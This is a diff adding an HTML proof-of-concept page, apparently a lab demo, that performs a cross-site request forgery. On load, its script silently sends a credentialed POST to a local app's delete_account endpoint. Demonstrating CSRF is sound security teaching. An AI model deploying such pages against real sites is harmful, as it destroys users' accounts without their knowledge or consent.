@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fetch CSRF Attack</title>
+</head>
+<body>
+    <h1>Cat-site Request Forgery</h1>
+    <img src="https://http.cat/images/200.jpg" alt="Cat">
+    <h1>Fetch-based CSRF</h1>
+    <script>
+        window.addEventListener('load', function () {
+            fetch('http://localhost:5000/delete_account', {
+                method: 'POST',
+                credentials: 'include'
+            }).then(function () {
+                console.log('Fetch-based CSRF request sent');
+            }).catch(function (error) {
+                console.error('Fetch CSRF failed', error);
+            });
+        });
+    </script>
+</body>
+</html>
